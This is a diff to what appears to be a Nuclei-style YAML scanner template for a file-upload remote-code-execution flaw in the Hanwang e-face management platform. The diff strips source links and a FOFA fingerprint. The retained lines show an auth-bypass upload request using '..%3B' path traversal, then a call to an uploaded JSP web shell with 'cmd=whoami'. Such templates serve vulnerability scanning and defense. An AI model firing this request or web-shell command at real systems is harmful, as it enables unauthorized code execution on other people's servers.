@@ -3,12 +3,8 @@ info:
   name: 汉王e脸通综合管理平台 uploadMapFile.do 文件上传致RCE漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/yyqb97kbzb8f9vln'
+  description: ''
   tags: rce,file-upload,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: yyqb97kbzb8f9vln
-    fofa: icon_hash="1380907357"
 http:
 - raw:
   - 'POST /manage/intercom/..%3B/..%3B/manage/visitorMapConfig/uploadMapFile.do HTTP/1.1
@@ -37,16 +33,13 @@ http:
 
     ------WebKitFormBoundaryFfJZ4PlAZBixjELj--
 
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1748013952373-3a8b22c6-dbc6-420d-a789-1202dba97998.png)
 
     验证路径
 
     /manage/resource/02a726ceea4343bab57c566bd41e1f8e.jsp?cmd=whoami
 
 
-    RCE
-
-    ![](https://cdn.nlark.com/yuque/0/2025/png/43110909/1748013952557-60920cf9-a861-4680-ae2d-64bfbe1147c9.png)'
+    RCE'
   redirects: false
   matchers:
   - status:
